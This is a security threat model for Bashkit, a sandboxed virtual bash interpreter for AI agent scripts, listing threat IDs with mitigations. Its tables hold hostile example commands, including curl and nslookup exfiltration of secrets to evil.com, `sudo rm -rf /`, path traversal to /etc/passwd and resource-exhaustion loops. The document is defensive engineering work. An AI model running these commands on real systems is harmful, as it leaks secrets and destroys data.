# Bashkit Threat Model

## Overview

Bashkit is a virtual bash interpreter for multi-tenant environments, primarily designed for AI agent script execution. This document analyzes security threats and mitigations.

**Threat Actors**: Malicious or buggy scripts from untrusted sources (AI agents, users)
**Assets**: Host CPU, memory, filesystem, network, secrets, other tenants

---

## Threat ID Management

This section documents the process for managing stable threat IDs.

### ID Scheme

All threats use a stable ID format: `TM-<CATEGORY>-<NUMBER>`

| Prefix | Category | Description |
|--------|----------|-------------|
| TM-DOS | Denial of Service | Resource exhaustion, infinite loops, CPU/memory attacks |
| TM-ESC | Sandbox Escape | Filesystem escape, process escape, privilege escalation |
| TM-INF | Information Disclosure | Secrets access, host info leakage, data exfiltration |
| TM-INJ | Injection | Command injection, path injection |
| TM-NET | Network Security | DNS manipulation, HTTP attacks, network bypass |
| TM-ISO | Isolation | Multi-tenant cross-access |
| TM-INT | Internal Errors | Panic recovery, error message safety, unexpected failures |
| TM-GIT | Git Security | Repository access, identity leak, remote operations |
| TM-LOG | Logging Security | Sensitive data in logs, log injection, log volume attacks |
| TM-PY | Python Security | Embedded Python sandbox escape, VFS isolation, resource limits |

### Adding New Threats

1. **Assign ID**: Use next available number in category (e.g., TM-DOS-010)
2. **Never reuse IDs**: Deprecated threats keep their ID with `[DEPRECATED]` prefix
3. **Update public doc**: Add entry to `crates/bashkit/docs/threat-model.md`
4. **Add code comment**: Reference threat ID at mitigation point (see format below)
5. **Add test**: Create test in `tests/threat_model_tests.rs` referencing ID

### Code Comment Format

```rust
// THREAT[TM-XXX-NNN]: Brief description of the threat being mitigated
// Mitigation: What this code does to prevent the attack
```

### Public Documentation

The public-facing threat model lives in `crates/bashkit/docs/threat-model.md` and is
embedded in rustdoc. It contains:
- High-level threat categories
- Attack vectors and mitigations
- Links to relevant code and tests
- Caller responsibilities

---

## Trust Model

```
┌─────────────────────────────────────────────────────────────┐
│                      UNTRUSTED                               │
│  ┌─────────────────────────────────────────────────────┐    │
│  │              Script Input (bash code)                │    │
│  └─────────────────────────────────────────────────────┘    │
│                           │                                  │
│                           ▼                                  │
│  ┌─────────────────────────────────────────────────────┐    │
│  │     TRUST BOUNDARY: Bash::exec(&str)                │    │
│  └─────────────────────────────────────────────────────┘    │
│                           │                                  │
└───────────────────────────┼──────────────────────────────────┘
                            ▼
┌─────────────────────────────────────────────────────────────┐
│                      VIRTUAL                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │  Parser  │→ │Interpreter│→ │Virtual FS│  │ Network  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
│  Controls: Resource Limits, FS Isolation, Network Allowlist │
└─────────────────────────────────────────────────────────────┘
```

---

## Threat Analysis by Category

### 1. Resource Exhaustion (DoS)

#### 1.1 Memory Exhaustion

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-DOS-001 | Large script input | `Bash::exec(huge_string)` | `max_input_bytes` limit (10MB) | **MITIGATED** |
| TM-DOS-002 | Output flooding | `yes \| head -n 1000000000` | Command limit stops loop | Mitigated |
| TM-DOS-003 | Variable explosion | `x=$(cat /dev/urandom)` | No /dev/urandom in VFS | Mitigated |
| TM-DOS-004 | Array growth | `arr+=(element)` in loop | Command limit | Mitigated |

**Current Risk**: LOW - Input size and command limits prevent unbounded memory consumption

**Implementation**: `ExecutionLimits` in `limits.rs`:
```rust
max_input_bytes: 10_000_000,    // 10MB script limit (TM-DOS-001)
max_commands: 10_000,           // Command limit per exec() call (TM-DOS-002, TM-DOS-004)
```

**Scope**: Limits are enforced **per `exec()` call**. Counters reset at the start of
each invocation via `ExecutionCounters::reset_for_execution()`, so a prior script
hitting the limit does not permanently poison the session. The timeout (30s) provides
the session-level backstop.

#### 1.5 Filesystem Exhaustion

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-DOS-005 | Large file creation | `dd if=/dev/zero bs=1G count=100` | `max_file_size` limit | **MITIGATED** |
| TM-DOS-006 | Many small files | `for i in $(seq 1 1000000); do touch $i; done` | `max_file_count` limit | **MITIGATED** |
| TM-DOS-007 | Zip bomb | `gunzip bomb.gz` (small file → huge output) | Decompression limit | **MITIGATED** |
| TM-DOS-008 | Tar bomb | `tar -xf bomb.tar` (many files / large files) | FS limits | **MITIGATED** |
| TM-DOS-009 | Recursive copy | `cp -r /tmp /tmp/copy` | FS limits | **MITIGATED** |
| TM-DOS-010 | Append flood | `while true; do echo x >> file; done` | FS limits + loop limit | **MITIGATED** |

**Current Risk**: LOW - Filesystem limits prevent unbounded memory consumption

**Implementation**: `FsLimits` struct in `fs/limits.rs`:
```rust
FsLimits {
    max_total_bytes: 100_000_000,    // 100MB total (TM-DOS-005, TM-DOS-008, TM-DOS-009)
    max_file_size: 10_000_000,       // 10MB per file (TM-DOS-005, TM-DOS-007)
    max_file_count: 10_000,          // 10K files max (TM-DOS-006, TM-DOS-008)
}
```

**Zip Bomb Protection** (TM-DOS-007):
- Decompression operations check output size against `max_file_size`
- Archive extraction checks total extracted size against `max_total_bytes`
- Extraction aborts early if limits would be exceeded

**Monitoring**: `du` and `df` builtins allow scripts to check usage

#### 1.6 Path and Name Attacks

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-DOS-011 | Symlink loops | `ln -s /a /b; ln -s /b /a` | No symlink following | **MITIGATED** |
| TM-DOS-012 | Deep directory nesting | `mkdir -p a/b/c/.../z` (1000 levels) | `max_path_depth` limit (100) | **MITIGATED** |
| TM-DOS-013 | Long filenames | Create 10KB filename | `max_filename_length` (255) + `max_path_length` (4096) | **MITIGATED** |
| TM-DOS-014 | Many directory entries | Create 1M files in one dir | `max_file_count` limit | **MITIGATED** |
| TM-DOS-015 | Unicode path attacks | Homoglyph/RTL override chars | `validate_path()` rejects control chars and bidi overrides | **MITIGATED** |

**Current Risk**: LOW - All vectors protected

**Implementation**: `FsLimits` in `fs/limits.rs`:
```rust
max_path_depth: 100,           // Max directory nesting (TM-DOS-012)
max_filename_length: 255,      // Max single component (TM-DOS-013)
max_path_length: 4096,         // Max total path (TM-DOS-013)
// validate_path() rejects control chars and bidi overrides (TM-DOS-015)
```

**Note**: Symlink loops (TM-DOS-011) are mitigated because InMemoryFs stores symlinks but doesn't
follow them during path resolution - symlink targets are only returned by `read_link()`.

#### 1.2 Infinite Loops

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-DOS-016 | While true | `while true; do :; done` | Loop limit (10K) | **MITIGATED** |
| TM-DOS-017 | For loop | `for i in $(seq 1 inf); do` | Loop limit | **MITIGATED** |
| TM-DOS-018 | Nested loops | `for i in ...; do for j in ...; done; done` | Per-loop + `max_total_loop_iterations` (1M) | **MITIGATED** |
| TM-DOS-019 | Command loop | `echo 1; echo 2; ...` x 100K | Command limit (10K) | **MITIGATED** |

**Current Risk**: LOW - Loop and command limits prevent infinite execution

**Implementation**: `limits.rs`
```rust
max_loop_iterations: 10_000,           // Per-loop limit (TM-DOS-016, TM-DOS-017)
max_total_loop_iterations: 1_000_000,  // Global cap across all loops (TM-DOS-018)
max_commands: 10_000,                  // Per-exec() command limit (TM-DOS-019)
```

All counters (commands, loop iterations, total loop iterations, function depth)
reset at the start of each `exec()` call. This ensures limits protect against
runaway scripts without permanently breaking the session.

#### 1.3 Stack Overflow (Recursion)

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-DOS-020 | Function recursion | `f() { f; }; f` | Depth limit (100) | **MITIGATED** |
| TM-DOS-021 | Command sub nesting | `$($($($())))` | Child parsers inherit remaining depth budget + fuel from parent | **MITIGATED** |
| TM-DOS-022 | Parser recursion | Deeply nested `(((())))` | `max_ast_depth` limit (100) + `HARD_MAX_AST_DEPTH` cap (100) | **MITIGATED** |
| TM-DOS-026 | Arithmetic recursion | `$(((((((...)))))))` deeply nested parens | `MAX_ARITHMETIC_DEPTH` limit (200) | **MITIGATED** |

**Current Risk**: LOW - Both execution and parser protected

**Implementation**: `limits.rs`, `parser/mod.rs`, `interpreter/mod.rs`
```rust
max_function_depth: 100,      // Runtime recursion (TM-DOS-020, TM-DOS-021)
max_ast_depth: 100,           // Parser recursion (TM-DOS-022)
// TM-DOS-021: Child parsers in command/process substitution inherit remaining
// depth budget and fuel from parent parser (parser/mod.rs lines 1553, 1670)
// TM-DOS-026: Arithmetic evaluator tracks recursion depth, capped at 200
// (interpreter/mod.rs MAX_ARITHMETIC_DEPTH)
```

**History** (TM-DOS-021): Previously marked MITIGATED but child parsers created via
`Parser::new()` used default limits, ignoring parent configuration. Fixed to propagate
`remaining_depth` and `fuel` from parent parser.

#### 1.4 CPU Exhaustion

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-DOS-023 | Long computation | Complex awk/sed regex | Timeout (30s) | **MITIGATED** |
| TM-DOS-024 | Parser hang | Malformed input | `parser_timeout` (5s) + `max_parser_operations` | **MITIGATED** |
| TM-DOS-025 | Regex backtrack | `grep "a](*b)*c" file` | Regex crate limits | Partial |
| TM-DOS-027 | Builtin parser recursion | Deeply nested awk/jq expressions | `MAX_AWK_PARSER_DEPTH` (100) + `MAX_JQ_JSON_DEPTH` (100) | **MITIGATED** |
| TM-DOS-028 | Diff algorithm DoS | `diff` on two large unrelated files | LCS matrix capped at 10M cells; falls back to simple line-by-line output | **MITIGATED** |

**Current Risk**: LOW - Parser timeout, fuel model, and depth limits prevent hangs and stack overflow

**Implementation**: `limits.rs`, `builtins/awk.rs`, `builtins/jq.rs`, `builtins/diff.rs`
```rust
timeout: Duration::from_secs(30),       // Execution timeout (TM-DOS-023)
parser_timeout: Duration::from_secs(5), // Parser timeout (TM-DOS-024)
max_parser_operations: 100_000,         // Parser fuel (TM-DOS-024)
// TM-DOS-027: Builtin parser depth limits (compile-time constants)
// MAX_AWK_PARSER_DEPTH: 100  (builtins/awk.rs) - awk expression recursion
// MAX_JQ_JSON_DEPTH: 100     (builtins/jq.rs)  - JSON input nesting depth
// TM-DOS-028: Diff LCS matrix cap (builtins/diff.rs)
// MAX_LCS_CELLS: 10_000_000 - prevents O(n*m) memory/CPU blow-up
```

---

### 2. Sandbox Escape

#### 2.1 Filesystem Escape

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-ESC-001 | Path traversal | `cat ../../../etc/passwd` | Path normalization | **MITIGATED** |
| TM-ESC-002 | Symlink escape | `ln -s /etc/passwd /tmp/x` | Symlinks not followed | **MITIGATED** |
| TM-ESC-003 | Real FS access | Direct syscalls | No real FS by default | **MITIGATED** |
| TM-ESC-004 | Mount escape | Mount real paths | MountableFs controlled | **MITIGATED** |

**Current Risk**: LOW - Virtual filesystem provides strong isolation

**Implementation**: `fs/memory.rs` - `normalize_path()` function
- Collapses `..` components at path boundaries
- Ensures all paths stay within virtual root

#### 2.2 Process Escape

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-ESC-005 | Shell escape | `exec /bin/bash` | exec not implemented (returns exit 127) | **MITIGATED** |
| TM-ESC-006 | Subprocess | `./malicious` | External exec disabled (returns exit 127) | **MITIGATED** |
| TM-ESC-007 | Background proc | `malicious &` | Background not implemented | **MITIGATED** |
| TM-ESC-008 | eval injection | `eval "$user_input"` | eval runs in sandbox (builtins only) | **MITIGATED** |
| TM-ESC-015 | bash/sh escape | `bash -c "malicious"` | Sandboxed re-invocation (no external bash) | **MITIGATED** |

**Current Risk**: LOW - No external process execution capability

**Implementation**: Unimplemented commands return bash-compatible error:
- Exit code: 127
- Stderr: `bash: <cmd>: command not found`
- Script continues execution (unless `set -e`)

**bash/sh Re-invocation** (TM-ESC-015): The `bash` and `sh` commands are handled
specially to re-invoke the virtual interpreter rather than spawning external
processes. This enables common patterns while maintaining security:
- `bash -c "cmd"` executes within the same virtual environment constraints
- `bash script.sh` reads and interprets the script in-process
- `bash --version` returns Bashkit version (never real bash info)
- Resource limits and virtual filesystem are shared with parent
- No escape to host shell is possible

#### 2.3 Privilege Escalation

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-ESC-009 | sudo/su | `sudo rm -rf /` | Not implemented | **MITIGATED** |
| TM-ESC-010 | setuid | Permission changes | Virtual FS, no real perms | **MITIGATED** |
| TM-ESC-011 | Capability abuse | Linux capabilities | Runs in-process | **MITIGATED** |

**Current Risk**: NONE - No privilege operations available

---

### 3. Information Disclosure

#### 3.1 Secrets Access

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-INF-001 | Env var leak | `echo $SECRET_KEY` | Env vars caller-controlled | **CALLER RISK** |
| TM-INF-002 | File secrets | `cat /secrets/key` | Virtual FS isolation | **MITIGATED** |
| TM-INF-003 | Proc secrets | `/proc/self/environ` | No /proc filesystem | **MITIGATED** |
| TM-INF-004 | Memory dump | Core dumps | No crash dumps | **MITIGATED** |

**Current Risk**: MEDIUM - Caller must sanitize environment variables

**Caller Responsibility** (TM-INF-001): Do NOT pass sensitive env vars:
```rust
// UNSAFE - leaks secrets
Bash::builder()
    .env("DATABASE_URL", "postgres://user:pass@host/db")
    .build();

// SAFE - only pass needed vars
Bash::builder()
    .env("HOME", "/home/user")
    .build();
```

#### 3.2 Host Information

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-INF-005 | Hostname | `hostname`, `$HOSTNAME` | Returns configurable virtual value | **MITIGATED** |
| TM-INF-006 | Username | `whoami`, `$USER` | Returns configurable virtual value | **MITIGATED** |
| TM-INF-007 | IP address | `ip addr`, `ifconfig` | Not implemented | **MITIGATED** |
| TM-INF-008 | System info | `uname -a` | Returns configurable virtual values | **MITIGATED** |
| TM-INF-009 | User ID | `id` | Returns hardcoded uid=1000 | **MITIGATED** |

**Current Risk**: NONE - System builtins return configurable virtual values (never real host info)

**Implementation**: `builtins/system.rs` provides configurable system builtins:
- `hostname` → configurable (default: "bashkit-sandbox")
- `uname` → hardcoded Linux 5.15.0 / configurable hostname
- `whoami` → configurable (default: "sandbox")
- `id` → uid=1000(configurable) gid=1000(configurable)

**Configuration**:
```rust
Bash::builder()
    .username("deploy")      // Sets whoami, id, and $USER env var
    .hostname("my-server")   // Sets hostname, uname -n
    .build();
```

#### 3.3 Network Exfiltration

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-INF-010 | HTTP exfil | `curl https://evil.com?data=$SECRET` | Network allowlist | **MITIGATED** |
| TM-INF-011 | DNS exfil | `nslookup $SECRET.evil.com` | No DNS commands | **MITIGATED** |
| TM-INF-012 | Timing channel | Response time variations | Not addressed | Minimal risk |

**Current Risk**: LOW - Network allowlist blocks unauthorized destinations

---

### 4. Injection Attacks

#### 4.1 Command Injection

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-INJ-001 | Variable injection | `$user_input` containing `; rm -rf /` | Variables not re-parsed | **MITIGATED** |
| TM-INJ-002 | Backtick injection | `` `$malicious` `` | Parsed as command sub | **MITIGATED** |
| TM-INJ-003 | eval bypass | `eval $user_input` | eval sandboxed (builtins only) | **MITIGATED** |

**Current Risk**: LOW - Bash's quoting rules apply, variables expand to strings only

**Example**:
```bash
# User provides: "; rm -rf /"
user_input="; rm -rf /"
echo $user_input
# Output: "; rm -rf /" (literal string, not executed)
```

#### 4.2 Path Injection

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-INJ-004 | Null byte | `cat "file\x00/../etc/passwd"` | Rust strings no nulls | **MITIGATED** |
| TM-INJ-005 | Path traversal | `../../../../etc/passwd` | Path normalization | **MITIGATED** |
| TM-INJ-006 | Encoding bypass | URL/unicode encoding | PathBuf handles | **MITIGATED** |

**Current Risk**: NONE - Rust's type system prevents these attacks

#### 4.3 XSS-like Issues

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-INJ-007 | HTML in output | Script outputs `<script>` | N/A - CLI tool | **NOT APPLICABLE** |
| TM-INJ-008 | Terminal escape | ANSI escape sequences | Caller should sanitize | **CALLER RISK** |

**Current Risk**: LOW - Bashkit is not a web application

**Caller Responsibility** (TM-INJ-008): Sanitize output if displayed in terminal/web UI:
```rust
let result = bash.exec(script).await?;
let safe_output = sanitize_terminal_escapes(&result.stdout);
```

---

### 5. Network Security

#### 5.1 DNS Manipulation

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-NET-001 | DNS spoofing | Resolve to wrong IP | No DNS resolution | **MITIGATED** |
| TM-NET-002 | DNS rebinding | Rebind after allowlist check | Literal host matching | **MITIGATED** |
| TM-NET-003 | DNS exfiltration | `dig secret.evil.com` | No DNS commands | **MITIGATED** |

**Current Risk**: NONE - Network allowlist uses literal host/IP matching, no DNS

**Implementation**: `network/allowlist.rs` - `matches_pattern()` function
```rust
// Allowlist matches literal strings, not resolved IPs
allowlist.allow("https://api.example.com");
// "api.example.com" must match exactly - no DNS lookup
```

#### 5.2 Network Bypass

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-NET-004 | IP instead of host | `curl http://93.184.216.34` | Literal IP blocked unless allowed | **MITIGATED** |
| TM-NET-005 | Port scanning | `curl http://internal:$port` | Port must match allowlist | **MITIGATED** |
| TM-NET-006 | Protocol downgrade | HTTPS → HTTP | Scheme must match | **MITIGATED** |
| TM-NET-007 | Subdomain bypass | `evil.example.com` | Exact host match | **MITIGATED** |

**Current Risk**: LOW - Strict allowlist enforcement

#### 5.3 HTTP Attack Vectors

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-NET-008 | Large response DoS | `curl https://evil.com/huge.bin` | Response size limit (10MB) | **MITIGATED** |
| TM-NET-009 | Connection hang | Server never responds | Connection timeout (10s default, user-configurable, clamped 1s-10min) | **MITIGATED** |
| TM-NET-010 | Slowloris attack | Slow response dripping | Read timeout (30s default, user-configurable, clamped 1s-10min) | **MITIGATED** |
| TM-NET-011 | Redirect bypass | `Location: http://evil.com` | Redirects not auto-followed | **MITIGATED** |
| TM-NET-012 | Chunked encoding bomb | Infinite chunked response | Response size limit (streaming) | **MITIGATED** |
| TM-NET-013 | Gzip bomb / Zip bomb | 10KB gzip → 10GB decompressed | Auto-decompression disabled | **MITIGATED** |
| TM-NET-014 | DNS rebind via redirect | Redirect to rebinded IP | Manual redirect requires allowlist check | **MITIGATED** |

**Current Risk**: LOW - Multiple mitigations in place

**Implementation**: `network/client.rs`
```rust
// Security defaults (TM-NET-008, TM-NET-009, TM-NET-010)
const DEFAULT_MAX_RESPONSE_BYTES: usize = 10 * 1024 * 1024;  // 10MB
const DEFAULT_TIMEOUT_SECS: u64 = 30;
const MAX_TIMEOUT_SECS: u64 = 600;   // 10 min - prevents resource exhaustion
const MIN_TIMEOUT_SECS: u64 = 1;     // Prevents instant timeouts
const CONNECT_TIMEOUT: Duration = Duration::from_secs(10);

// Redirects disabled by default (TM-NET-011, TM-NET-014)
.redirect(reqwest::redirect::Policy::none())

// Decompression disabled to prevent zip bombs (TM-NET-013)
.no_gzip()
.no_brotli()
.no_deflate()

// Response size checked during streaming (TM-NET-008, TM-NET-012)
async fn read_body_with_limit(&self, response: Response) -> Result<Vec<u8>> {
    // Streams response, checks size at each chunk
}
```

#### 5.4 HTTP Client Mitigations

| Mitigation | Implementation | Purpose |
|------------|---------------|---------|
| URL allowlist | Pre-request validation | Prevent unauthorized destinations |
| Response size limit | Streaming with byte counting | Prevent memory exhaustion |
| Connection timeout | 10s default (user-configurable via `--connect-timeout`) | Prevent connection hang |
| Read timeout | 30s default (user-configurable via `-m`/`-T`) | Prevent slow-response DoS |
| Timeout clamping | All timeouts clamped to [1s, 10min] | Prevent resource exhaustion |
| No auto-redirect | Policy::none() | Prevent redirect-based bypass |
| No auto-decompress | no_gzip/no_brotli/no_deflate | Prevent zip bomb attacks |
| Content-Length check | Pre-download validation | Fail fast on huge files |
| User-Agent fixed | "bashkit/0.1.0" | Identify requests, prevent spoofing |

#### 5.5 curl/wget Security Model

**Request Flow**:
```
Script: curl https://api.example.com/data
         │
         ▼
┌─────────────────────────────────────────┐
│ 1. URL Allowlist Check (BEFORE network) │
│    - Scheme match (https)               │
│    - Host match (literal)               │
│    - Port match (443 default)           │
│    - Path prefix match                  │
└─────────────────────────────────────────┘
         │ Allowed?
         │ No → Return "access denied" (exit 7)
         │ Yes ↓
┌─────────────────────────────────────────┐
│ 2. Connect with Timeout (10s)           │
│    - TCP connection                     │
│    - TLS handshake                      │
└─────────────────────────────────────────┘
         │ Success?
         │ No → Return "request failed" (exit 1)
         │ Yes ↓
┌─────────────────────────────────────────┐
│ 3. Content-Length Check                 │
│    - If header present, check < 10MB    │
│    - If > 10MB, abort early             │
└─────────────────────────────────────────┘
         │ Size OK?
         │ No → Return "response too large" (exit 63)
         │ Yes ↓
┌─────────────────────────────────────────┐
│ 4. Stream Response with Size Limit      │
│    - Read chunks                        │
│    - Accumulate bytes                   │
│    - Abort if total > 10MB              │
└─────────────────────────────────────────┘
         │ Complete?
         │ No → Return "response too large" (exit 63)
         │ Yes ↓
┌─────────────────────────────────────────┐
│ 5. Handle Redirect (if -L flag)         │
│    - Extract Location header            │
│    - Check EACH redirect URL against    │
│      allowlist (go to step 1)           │
│    - Max 10 redirects                   │
└─────────────────────────────────────────┘
         │
         ▼
     Return response to script
```

**Exit Codes**:
- 0: Success
- 1: General error
- 3: URL malformed
- 7: Access denied (allowlist)
- 22: HTTP error (with -f flag)
- 28: Timeout
- 47: Max redirects exceeded
- 63: Response too large

---

### 6. Multi-Tenant Isolation

#### 6.1 Cross-Tenant Access

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-ISO-001 | Shared filesystem | Access other tenant files | Separate Bash instances | **MITIGATED** |
| TM-ISO-002 | Shared memory | Read other tenant data | Rust memory safety | **MITIGATED** |
| TM-ISO-003 | Resource starvation | One tenant exhausts limits | Per-instance limits | **MITIGATED** |

**Current Risk**: LOW - Each Bash instance is fully isolated

**Implementation**: Each tenant gets separate instance with isolated state:
```rust
// Each tenant gets isolated instance (TM-ISO-001, TM-ISO-002, TM-ISO-003)
let tenant_a = Bash::builder()
    .fs(Arc::new(InMemoryFs::new()))
    .limits(tenant_limits)
    .build();

let tenant_b = Bash::builder()
    .fs(Arc::new(InMemoryFs::new()))  // Separate FS
    .limits(tenant_limits)
    .build();
```

---

### 7. Internal Error Handling

#### 7.1 Panic Recovery

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-INT-001 | Builtin panic crash | Invalid input triggers panic in builtin | `catch_unwind` wrapper on all builtins | **MITIGATED** |
| TM-INT-002 | Panic info leak | Panic message reveals sensitive data | Sanitized error messages (no panic details) | **MITIGATED** |
| TM-INT-003 | Date format panic | Invalid strftime format causes chrono panic | Pre-validation with `StrftimeItems` | **MITIGATED** |

**Current Risk**: LOW - All builtin panics are caught and converted to sanitized errors

**Implementation**: `interpreter/mod.rs` - Panic catching for all builtins:
```rust
// THREAT[TM-INT-001]: Builtins may panic on unexpected input
let result = AssertUnwindSafe(builtin.execute(ctx)).catch_unwind().await;

match result {
    Ok(Ok(exec_result)) => exec_result,
    Ok(Err(e)) => return Err(e),
    Err(_panic) => {
        // THREAT[TM-INT-002]: Panic message may contain sensitive info
        // Return sanitized error - never expose panic details
        ExecResult::err(format!("bash: {}: builtin failed unexpectedly\n", name), 1)
    }
}
```

**Date Format Validation** (TM-INT-003): `builtins/date.rs`
```rust
// THREAT[TM-INT-003]: chrono::format() can panic on invalid format specifiers
fn validate_format(format: &str) -> Result<(), String> {
    for item in StrftimeItems::new(format) {
        if let Item::Error = item {
            return Err(format!("invalid format string: '{}'", format));
        }
    }
    Ok(())
}
```

#### 7.2 Error Message Safety

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-INT-004 | Path leak in errors | Error shows real filesystem paths | Virtual paths only in messages | **MITIGATED** |
| TM-INT-005 | Memory addr in errors | Debug output shows addresses | Display impl hides addresses | **MITIGATED** |
| TM-INT-006 | Stack trace exposure | Panic unwinds show call stack | `catch_unwind` prevents propagation | **MITIGATED** |

**Error Type Design**: `error.rs`
- All error messages are designed for end-user display
- `Internal` error variant for unexpected failures (never includes panic details)
- Error types implement Display without exposing internals

---

### 8. Git Security

Bashkit provides optional virtual git operations via the `git` feature. This section documents
security threats related to git operations and their mitigations.

#### 8.1 Repository Access

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-GIT-001 | Unauthorized clone | `git clone https://evil.com/repo` | Remote URL allowlist (Phase 2) | **PLANNED** |
| TM-GIT-002 | Host identity leak | Commit reveals real name/email | Configurable virtual identity | **MITIGATED** |
| TM-GIT-003 | Host git config access | Read ~/.gitconfig | No host filesystem access | **MITIGATED** |
| TM-GIT-004 | Credential theft | Access git credential store | No host filesystem access | **MITIGATED** |
| TM-GIT-005 | Repository escape | `git clone` outside VFS | All paths in VFS | **MITIGATED** |

**Current Risk**: LOW - All git operations confined to virtual filesystem

**Implementation**: `git/client.rs`
```rust
// THREAT[TM-GIT-002]: Host identity leak
// Author identity is configurable, never reads from host ~/.gitconfig
let config = format!(
    "[user]\n\tname = {}\n\temail = {}\n",
    self.config.author_name, self.config.author_email
);
```

#### 8.2 Git-specific DoS

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-GIT-006 | Large repo clone | Clone huge repository | FS size limits + response limit (Phase 2) | **PLANNED** |
| TM-GIT-007 | Many git objects | Create millions of git objects | `max_file_count` FS limit | **MITIGATED** |
| TM-GIT-008 | Deep history | Very long commit history | Log limit parameter | **MITIGATED** |
| TM-GIT-009 | Large pack files | Huge .git/objects/pack | `max_file_size` FS limit | **MITIGATED** |

**Current Risk**: LOW - Filesystem limits apply to all git operations

#### 8.3 Remote Operations (Phase 2)

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-GIT-010 | Push to unauthorized remote | `git push evil.com` | Remote URL allowlist | **PLANNED** |
| TM-GIT-011 | Fetch from unauthorized remote | `git fetch evil.com` | Remote URL allowlist | **PLANNED** |
| TM-GIT-012 | SSH key access | Use host SSH keys | HTTPS only (no SSH) | **PLANNED** |
| TM-GIT-013 | Git protocol bypass | Use git:// protocol | HTTPS only | **PLANNED** |

**Current Risk**: N/A - Remote operations not yet implemented (Phase 2)

---

### 9. Logging Security

Bashkit provides optional structured logging via the `logging` feature. This section documents
security threats related to logging and their mitigations.

#### 9.1 Sensitive Data Leakage

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-LOG-001 | Secrets in logs | Log env vars containing passwords/tokens | LogConfig redaction | **MITIGATED** |
| TM-LOG-002 | Script content leak | Log full scripts containing embedded secrets | Script content disabled by default | **MITIGATED** |
| TM-LOG-003 | URL credential leak | Log URLs with `user:pass@host` | URL credential redaction | **MITIGATED** |
| TM-LOG-004 | API key detection | Log values that look like API keys/JWTs | Entropy-based detection | **MITIGATED** |

**Current Risk**: LOW - Sensitive data is redacted by default

**Implementation**: `logging.rs` provides `LogConfig` with redaction:
```rust
// Default configuration redacts sensitive data (TM-LOG-001 to TM-LOG-004)
let config = LogConfig::new();

// Redacts env vars matching: PASSWORD, SECRET, TOKEN, KEY, etc.
assert!(config.should_redact_env("DATABASE_PASSWORD"));

// Redacts URL credentials
assert_eq!(
    config.redact_url("https://user:pass@host.com"),
    "https://[REDACTED]@host.com"
);

// Detects API keys and JWTs
assert_eq!(config.redact_value("sk-1234567890abcdef"), "[REDACTED]");
```

**Caller Warning**: Using `LogConfig::unsafe_disable_redaction()` or
`LogConfig::unsafe_log_scripts()` may expose sensitive data in logs.

#### 9.2 Log Injection

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-LOG-005 | Newline injection | Script contains `\n[ERROR] fake` | Newline escaping | **MITIGATED** |
| TM-LOG-006 | Control char injection | ANSI escape sequences in logs | Control char filtering | **MITIGATED** |

**Current Risk**: LOW - Log content is sanitized

**Implementation**: `logging::sanitize_for_log()` escapes dangerous characters:
```rust
// TM-LOG-005: Newlines escaped to prevent fake log entries
let input = "normal\n[ERROR] injected";
let sanitized = sanitize_for_log(input);
// Result: "normal\\n[ERROR] injected"
```

#### 9.3 Log Volume Attacks

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-LOG-007 | Log flooding | Script generates excessive output → many logs | Value truncation | **MITIGATED** |
| TM-LOG-008 | Large value DoS | Log very long strings | `max_value_length` limit (200) | **MITIGATED** |

**Current Risk**: LOW - Log values are truncated

**Implementation**: `LogConfig` limits value lengths:
```rust
// TM-LOG-008: Values truncated to prevent memory exhaustion
let config = LogConfig::new().max_value_length(200);
let long_value = "a".repeat(1000);
let truncated = config.truncate(&long_value);
// Result: "aaa...[truncated 800 bytes]"
```

#### 9.4 Logging Security Configuration

**Secure Defaults** (TM-LOG-001 to TM-LOG-008):
```rust
let config = LogConfig::new();
// - redact_sensitive: true (default)
// - log_script_content: false (default)
// - log_file_contents: false (default)
// - max_value_length: 200 (default)
```

**Custom Redaction Patterns**:
```rust
// Add custom env var patterns to redact
let config = LogConfig::new()
    .redact_env("MY_CUSTOM_SECRET")
    .redact_env("INTERNAL_TOKEN");
```

---

## Vulnerability Summary

This section maps former vulnerability IDs to the new threat ID scheme and tracks status.

### Mitigated (Previously Critical/High)

| Old ID | Threat ID | Vulnerability | Status |
